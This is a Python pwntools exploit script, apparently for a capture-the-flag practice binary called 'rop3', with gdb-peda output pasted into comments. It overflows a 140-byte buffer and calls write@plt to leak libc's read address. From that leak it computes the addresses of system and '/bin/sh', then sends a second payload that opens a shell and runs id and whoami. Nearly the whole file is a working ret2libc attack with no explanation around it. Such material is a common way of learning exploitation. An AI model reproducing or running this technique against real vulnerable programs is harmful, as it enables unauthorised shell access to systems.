from pprint import pprint as pp
from pwn import *

context(arch="i386",
        os="linux",
        log_level=logging.DEBUG)

# $1 = {ssize_t (int, void *, size_t)} 0xf7ece1a0 <__GI___libc_read>
# $2 = {int (const char *)} 0xf7e1e8b0 <__libc_system>
# gdb-peda$ p $1 - $2
# $5 = 0xaf8f0
# gdb-peda$ p exit
# $6 = {void (int)} 0xf7e112c0 <__GI_exit>
# gdb-peda$ p $1 - $6
# $7 = 0xbcee0
# gdb-peda$ find /bin
# Searching for '/bin' in: None ranges
# Found 13 results, display max 13 items:
#    libc : 0xf7f6942d ("/bin/sh")

if True:
    io = process('./rop3', shell=True)
else:
    io = gdb.debug('./rop3', gdbscript='''
n
break vulnerable_function
c
''')


# continue;
# gdb.attach(io, '''
# break vulnerable_function;
# continue;
# ''')

# io.interactive()
# exit(1)

# gdb-peda$ telescope 0x804a000
# 0000| 0x804a000 --> 0xf7eb7cb0 (<read>: push   esi)
# 0004| 0x804a004 --> 0xf7e90e90 (<getegid>:      mov    eax,0xca)
# 0008| 0x804a008 --> 0x8048386 (<__gmon_start__@plt+6>:  push   0x10)
# 0012| 0x804a00c --> 0xf7de9d90 (<__libc_start_main>:    call   0xf7f08379)

# gdb-peda$ tele 0x80483a0
# 0000| 0x80483a0 (<write@plt>:	jmp    DWORD PTR ds:0x804a010)
# 0004| 0x80483a4 (<write@plt+4>:	add    al,0x8)
# 0008| 0x80483a8 (<write@plt+8>:	add    BYTE PTR [eax],al)
# 0012| 0x80483ac (<write@plt+12>:	mov    al,ds:0xffffffff)
# 0016| 0x80483b0 (<setresgid@plt>:	jmp    DWORD PTR ds:0x804a014)
# 0020| 0x80483b4 (<setresgid@plt+4>:	add    al,0x8)
# 0024| 0x80483b8 (<setresgid@plt+8>:	add    BYTE PTR [eax],al)
# 0028| 0x80483bc (<setresgid@plt+12>:	nop)

payload = ''.join([
    140 * 'A',          #
    p32(0x80483a0),
    p32(0x8048474),     # --> vulnerable_function
    p32(0x1),
    p32(0x804a000),
    p32(0x4),
])
io.sendline(payload)
# pp(io.recv(4))

read_addr = unpack(io.recv(4))
system_addr = read_addr - 0xa9ab0
binsh_addr = read_addr + 0x9741f

log.info("read_addr   = 0x%x", read_addr)
log.info("system_addr = 0x%x", system_addr)
log.info("binsh_addr  = 0x%x", binsh_addr)


raw_input("press any key")

payload = ''.join([
    140 * 'A',          #
    p32(system_addr),
    p32(0xaaaaaaaa),
    p32(binsh_addr),
])
io.sendline(payload)
io.sendline('id')
io.sendline('whoami')
io.sendline('exit')
io.interactive()
